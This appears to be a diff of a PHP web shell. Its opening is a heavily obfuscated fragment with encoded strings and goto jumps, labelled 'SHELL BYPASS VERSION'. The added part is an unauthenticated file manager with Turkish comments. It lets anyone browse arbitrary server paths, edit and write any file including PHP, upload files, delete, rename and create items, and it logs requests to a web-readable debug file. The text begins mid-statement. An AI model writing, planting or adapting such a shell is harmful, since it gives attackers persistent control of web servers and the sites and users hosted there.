"\x44\111\x52" : round(filesize($qTTfA) / 1024, 1) . "\113") . "\x3c\57\x74\x64\x3e\xd\xa\40\40\40\40\x20\x20\40\40\40\x20\40\x20\74\164\144\x20\x73\x74\171\x6c\x65\75\x27\x63\157\x6c\x6f\x72\72" . (is_writable($qTTfA) ? "\43\60\x66\60" : "\43\x66\x30\x30") . "\47\x3e{$niNsK}\74\x2f\164\x64\76\15\12\x20\40\40\x20\x20\x20\40\40\x20\40\40\x20\x3c\x74\x64\76\x3c\141\x20\x68\x72\x65\146\x3d\47\x3f\x70\x61\x74\x68\75{$qAaNI}\x26\151\x74\x65\x6d\x3d{$fR9mM}\46\145\x64\151\164\x3d\61\x27\76\105\x64\x69\164\74\x2f\141\76\40\x7c\x20\74\x61\40\x68\162\145\146\x3d\x27\x3f\x70\141\164\150\x3d{$qAaNI}\x26\x69\164\145\155\x3d{$fR9mM}\46\162\x65\156\x61\155\145\75\x31\47\x3e\x52\145\x6e\74\x2f\x61\76\x20\174\x20\x3c\x61\40\x68\162\145\146\x3d\x27\77\160\x61\164\x68\75{$qAaNI}\46\x69\164\x65\155\x3d{$fR9mM}\46\x63\x68\155\x6f\144\75\x31\47\76\x43\150\x6d\157\x64\x3c\x2f\141\x3e\x20\174\x20\x3c\141\x20\150\x72\x65\146\75\x27\x3f\x70\x61\x74\150\x3d{$qAaNI}\46\x64\145\x6c\x3d{$fR9mM}\x27\x3e\104\145\x6c\x3c\x2f\141\76\74\57\164\144\76\15\xa\40\x20\40\40\40\x20\40\x20\74\57\x74\162\76"; goto KiO6k; RBIxH: if (!($fR9mM == "\x2e" || $fR9mM == "\x2e\x2e")) { goto n0GDy; } goto DFEKm; ZJYb5: } goto FwBTz; Nv8vk: ini_set("\x64\x69\x73\160\154\141\x79\137\x65\162\x72\x6f\x72\163", 0); goto tG8VZ; X_89P: echo "\x3c\144\x69\x76\40\x63\x6c\141\x73\163\x3d\47\150\145\x61\x64\x65\162\x2d\164\151\x74\154\145\x27\x3e\123\110\105\x4c\114\40\x42\x59\x50\101\123\x53\40\x56\105\122\123\x49\x4f\116\x3c\x2f\x64\x69\x76\x3e"; goto j31Ib; mLLU5: echo "\74\x2f\x62\157\144\171\x3e\x3c\x2f\x68\164\155\x6c\x3e";
+// Debug mode - tüm hataları göster
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('log_errors', 1);
+
+$current = isset($_GET['path']) ? $_GET['path'] : getcwd();
+$current = realpath($current);
+if (!$current || !is_dir($current)) {
+    $current = getcwd();
+}
+
+$item = isset($_GET['item']) ? basename($_GET['item']) : "";
+$itemPath = $current . "/" . $item;
+
+// DEBUG: Hata ayıklama için log dosyası
+function debug_log($msg) {
+    $logFile = __DIR__ . '/debug_log.txt';
+    file_put_contents($logFile, date('Y-m-d H:i:s') . ' - ' . $msg . PHP_EOL, FILE_APPEND);
+}
+
+// Edit işlemi
+if (isset($_GET['action']) && $_GET['action'] === 'edit' && !empty($item)) {
+    debug_log("Edit action - File: $itemPath");
+    
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        debug_log("POST received for edit");
+        $content = $_POST['content'];
+        $result = file_put_contents($itemPath, $content);
+        debug_log("Write result: " . ($result !== false ? "SUCCESS ($result bytes)" : "FAILED"));
+        
+        if ($result !== false) {
+            echo "<script>alert('✅ Saved!'); window.location='?path=" . urlencode($current) . "';</script>";
+        } else {
+            echo "<script>alert('❌ Save failed! Check permissions.'); window.history.back();</script>";
+        }
+        exit;
+    }
+    
+    if (!file_exists($itemPath)) {
+        echo "<h3>Error: File not found!</h3>";
+        echo "<a href='?path=" . urlencode($current) . "'>← Back</a>";
+        exit;
+    }
+    
+    $content = htmlspecialchars(file_get_contents($itemPath));
+    echo "<!DOCTYPE html>
+    <html>
+    <head><title>Edit File</title>
+    <style>
+        body { font-family: monospace; margin: 20px; }
+        textarea { width: 100%; height: 500px; font-family: monospace; border: 1px solid #ccc; padding: 10px; }
+        button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; font-size: 16px; }
+        button:hover { background: #218838; }
+        a { color: #007bff; text-decoration: none; }
+        .info { background: #e3f2fd; padding: 10px; margin: 10px 0; border-left: 4px solid #2196f3; }
+    </style>
+    </head>
+    <body>
+    <a href='?path=" . urlencode($current) . "'>← Back to Directory</a>
+    <div class='info'>
+        <strong>Editing:</strong> " . htmlspecialchars($item) . "<br>
+        <strong>Path:</strong> " . htmlspecialchars($itemPath) . "<br>
+        <strong>Writable:</strong> " . (is_writable($itemPath) ? 'Yes ✅' : 'No ❌') . "
+    </div>
+    <form method='post'>
+    <textarea name='content'>$content</textarea>
+    <br><button type='submit'>💾 Save Changes</button>
+    </form>
+    </body>
+    </html>";
+    exit;
+}
+
+// Delete işlemi
+if (isset($_GET['action']) && $_GET['action'] === 'delete' && !empty($item)) {
+    debug_log("Delete action - Path: $itemPath");
+    
+    if (file_exists($itemPath)) {
+        if (is_dir($itemPath)) {
+            if (rmdir($itemPath)) {
+                debug_log("Folder deleted: $itemPath");
+            } else {
+                debug_log("Failed to delete folder: $itemPath");
+            }
+        } else {
+            if (unlink($itemPath)) {
+                debug_log("File deleted: $itemPath");
+            } else {
+                debug_log("Failed to delete file: $itemPath");
+            }
+        }
+    }
+    header("Location: ?path=" . urlencode($current));
+    exit;
+}
+
+// Rename işlemi
+if (isset($_GET['action']) && $_GET['action'] === 'rename' && !empty($item)) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $newName = basename($_POST['new_name']);
+        $newPath = $current . "/" . $newName;
+        debug_log("Rename: $itemPath -> $newPath");
+        
+        if (!file_exists($newPath)) {
+            if (rename($itemPath, $newPath)) {
+                debug_log("Rename SUCCESS");
+            } else {
+                debug_log("Rename FAILED");
+            }
+        }
+        header("Location: ?path=" . urlencode($current));
+        exit;
+    }
+    
+    echo "<!DOCTYPE html>
+    <html>
+    <head><title>Rename</title>
+    <style>
+        body { font-family: Arial; margin: 20px; }
+        input { padding: 8px; width: 300px; border: 1px solid #ccc; }
+        button { padding: 8px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
+    </style>
+    </head>
+    <body>
+    <a href='?path=" . urlencode($current) . "'>← Back</a>
+    <h3>Rename: " . htmlspecialchars($item) . "</h3>
+    <form method='post'>
+    <input type='text' name='new_name' value='" . htmlspecialchars($item) . "'>
+    <button type='submit'>Rename</button>
+    </form>
+    </body>
+    </html>";
+    exit;
+}
+
+// Upload işlemi sayfası
+if (isset($_GET['upload'])) {
+    echo "<!DOCTYPE html>
+    <html>
+    <head><title>Upload File</title>
+    <style>
+        body { font-family: Arial; margin: 20px; }
+        .upload-box { background: #f8f9fa; padding: 20px; border: 2px dashed #ccc; text-align: center; max-width: 500px; margin: 50px auto; }
+        input[type=file] { margin: 20px 0; }
+        button { padding: 10px 30px; background: #28a745; color: white; border: none; cursor: pointer; font-size: 16px; }
+        .info { background: #e3f2fd; padding: 10px; margin: 10px 0; }
+    </style>
+    </head>
+    <body>
+    <a href='?path=" . urlencode($current) . "'>← Back to Directory</a>
+    <div class='upload-box'>
+        <h3>📤 Upload File</h3>
+        <div class='info'>Upload to: <strong>" . htmlspecialchars($current) . "</strong></div>
+        <div class='info'>Directory writable: " . (is_writable($current) ? '✅ Yes' : '❌ No') . "</div>
+        <form method='post' enctype='multipart/form-data' action='?upload_handler=1&path=" . urlencode($current) . "'>
+        <input type='file' name='file' required>
+        <br><button type='submit'>Upload File</button>
+        </form>
+    </div>
+    </body>
+    </html>";
+    exit;
+}
+
+// Upload handler
+if (isset($_GET['upload_handler'])) {
+    $targetDir = $_GET['path'] ?? getcwd();
+    $targetDir = realpath($targetDir);
+    
+    debug_log("Upload handler - Target dir: $targetDir");
+    debug_log("POST data: " . print_r($_POST, true));
+    debug_log("FILES data: " . print_r($_FILES, true));
+    
+    if (!empty($_FILES['file']['name'])) {
+        $fileName = basename($_FILES['file']['name']);
+        $targetFile = $targetDir . "/" . $fileName;
+        
+        debug_log("Uploading: $fileName to $targetFile");
+        debug_log("Temp file: " . $_FILES['file']['tmp_name']);
+        debug_log("Upload error code: " . $_FILES['file']['error']);
+        
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
+            chmod($targetFile, 0644);
+            debug_log("Upload SUCCESS: $targetFile");
+            echo "<script>alert('✅ Uploaded: " . addslashes($fileName) . "'); window.location='?path=" . urlencode($targetDir) . "';</script>";
+        } else {
+            $errorMsg = "Upload FAILED. Error: " . $_FILES['file']['error'];
+            debug_log($errorMsg);
+            echo "<script>alert('❌ " . $errorMsg . "'); window.location='?upload=1&path=" . urlencode($targetDir) . "';</script>";
+        }
+    } else {
+        debug_log("No file uploaded");
+        header("Location: ?path=" . urlencode($targetDir));
+    }
+    exit;
+}
+
+// Create folder
+if (isset($_POST['create_folder'])) {
+    $folderName = basename($_POST['folder_name']);
+    if (!empty($folderName)) {
+        $folderPath = $current . "/" . $folderName;
+        debug_log("Create folder: $folderPath");
+        if (!file_exists($folderPath)) {
+            if (mkdir($folderPath, 0755)) {
+                debug_log("Folder created");
+            } else {
+                debug_log("Folder creation FAILED");
+            }
+        }
+    }
+    header("Location: ?path=" . urlencode($current));
+    exit;
+}
+
+// Create file
+if (isset($_POST['create_file'])) {
+    $fileName = basename($_POST['file_name']);
+    if (!empty($fileName)) {
+        $filePath = $current . "/" . $fileName;
+        debug_log("Create file: $filePath");
+        if (!file_exists($filePath)) {
+            $result = file_put_contents($filePath, $_POST['file_content'] ?? '');
+            if ($result !== false) {
+                chmod($filePath, 0644);
+                debug_log("File created, bytes: $result");
+            } else {
+                debug_log("File creation FAILED");
+            }
+        }
+    }
+    header("Location: ?path=" . urlencode($current));
+    exit;
+}
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Manager</title>
+    <meta charset="UTF-8">
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .current-path { background: #e3f2fd; padding: 10px; margin: 10px 0; border-radius: 3px; border-left: 4px solid #2196f3; }
+        ul { list-style: none; padding: 0; margin: 0; }
+        li { padding: 10px; margin: 2px 0; background: #fafafa; border: 1px solid #eee; border-radius: 3px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        li:hover { background: #f0f0f0; }
+        .folder { border-left: 3px solid #ff9800; }
+        .file { border-left: 3px solid #4caf50; }
+        .item-name { font-weight: bold; }
+        .item-name a { text-decoration: none; color: #333; }
+        .item-name a:hover { color: #2196f3; }
+        .action-links { display: inline-block; }
+        .action-links a { font-size: 12px; margin-left: 10px; color: #666; text-decoration: none; padding: 2px 5px; border-radius: 3px; }
+        .action-links a:hover { background: #e0e0e0; color: #333; }
+        button, .button { display: inline-block; padding: 8px 15px; margin: 5px 0; background: #2196f3; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 14px; text-decoration: none; }
+        button:hover, .button:hover { background: #1976d2; }
+        hr { margin: 20px 0; border: none; border-top: 1px solid #ddd; }
+        h3 { margin: 15px 0 10px 0; color: #333; }
+        input[type="text"], textarea { padding: 8px; border: 1px solid #ddd; border-radius: 3px; width: 100%; max-width: 400px; }
+        textarea { max-width: 600px; font-family: monospace; }
+        .form-group { margin-bottom: 10px; }
+        .upload-area { background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 10px 0; }
+        .debug-link { font-size: 12px; color: #999; margin-top: 20px; text-align: center; }
+        .debug-link a { color: #999; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📁 File Manager</h1>
+    
+    <?php
+    // List directory function
+    function listDirectory($dir) {
+        $files = scandir($dir);
+        $items = [];
+        
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') continue;
+            $items[] = $file;
+        }
+        
+        sort($items);
+        
+        if (empty($items)) {
+            echo "<p><em>Directory is empty</em></p>";
+            return;
+        }
+        
+        echo "<ul>";
+        foreach ($items as $item) {
+            $fullPath = $dir . "/" . $item;
+            $isDir = is_dir($fullPath);
+            
+            echo "<li class='" . ($isDir ? 'folder' : 'file') . "'>";
+            echo "<div class='item-name'>";
+            
+            if ($isDir) {
+                echo "📁 <a href='?path=" . urlencode($fullPath) . "'><strong>" . htmlspecialchars($item) . "</strong></a>";
+            } else {
+                echo "📄 <strong>" . htmlspecialchars($item) . "</strong>";
+            }
+            
+            echo "</div><div class='action-links'>";
+            
+            if ($isDir) {
+                echo "<a href='?action=rename&path=" . urlencode($dir) . "&item=" . urlencode($item) . "'>✏️ Rename</a>";
+                echo "<a href='?action=delete&path=" . urlencode($dir) . "&item=" . urlencode($item) . "' onclick='return confirm(\"Delete folder " . htmlspecialchars($item) . "?\")'>🗑️ Delete</a>";
+            } else {
+                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
+                $editable = in_array($ext, ['txt', 'html', 'htm', 'css', 'js', 'php', 'xml', 'json', 'md', 'sql']);
+                
+                if ($editable) {
+                    echo "<a href='?action=edit&path=" . urlencode($dir) . "&item=" . urlencode($item) . "'>✏️ Edit</a>";
+                }
+                echo "<a href='?action=rename&path=" . urlencode($dir) . "&item=" . urlencode($item) . "'>✏️ Rename</a>";
+                echo "<a href='?action=delete&path=" . urlencode($dir) . "&item=" . urlencode($item) . "' onclick='return confirm(\"Delete file " . htmlspecialchars($item) . "?\")'>🗑️ Delete</a>";
+            }
+            
+            echo "</div></li>";
+        }
+        echo "</ul>";
+    }
+    ?>
+    
+    <div class="current-path">
+        <strong>📍 Current Path:</strong> <?php echo htmlspecialchars($current); ?>
+        <div style="margin-top: 8px;">
+            <a href="?path=<?php echo urlencode(dirname($current)); ?>" class="button" style="background: #6c757d;">⬆ Up</a>
+            <a href="?path=<?php echo urlencode(getcwd()); ?>" class="button" style="background: #6c757d;">🏠 Root</a>
+        </div>
+    </div>
+    
+    <?php listDirectory($current); ?>
+    
+    <hr>
+    
+    <div class="upload-area">
+        <h3>📤 Upload File</h3>
+        <a href="?upload=1&path=<?php echo urlencode($current); ?>" class="button">Upload File →</a>
+    </div>
+    
+    <hr>
+    
+    <h3>📁 Create Folder</h3>
+    <form method="post">
+        <input type="hidden" name="create_folder" value="1">
+        <div class="form-group">
+            <input type="text" name="folder_name" placeholder="folder name" required>
+        </div>
+        <button type="submit">Create Folder</button>
+    </form>
+    
+    <hr>
+    
+    <h3>📄 Create File</h3>
+    <form method="post">
+        <input type="hidden" name="create_file" value="1">
+        <div class="form-group">
+            <input type="text" name="file_name" placeholder="filename.txt" required>
+        </div>
+        <div class="form-group">
+            <textarea name="file_content" placeholder="File content (optional)" rows="5" cols="50"></textarea>
+        </div>
+        <button type="submit">Create File</button>
+    </form>
+    
+    <div class="debug-link">
+        <a href="debug_log.txt" target="_blank">📋 View Debug Log</a> | 
+        <a href="?clear_log=1">🗑️ Clear Log</a>
+    </div>
+</div>
+</body>
+</html>
+
+<?php
+// Clear debug log
+if (isset($_GET['clear_log'])) {
+    unlink(__DIR__ . '/debug_log.txt');
+    header("Location: ?path=" . urlencode($current));
+    exit;
+}
+?>
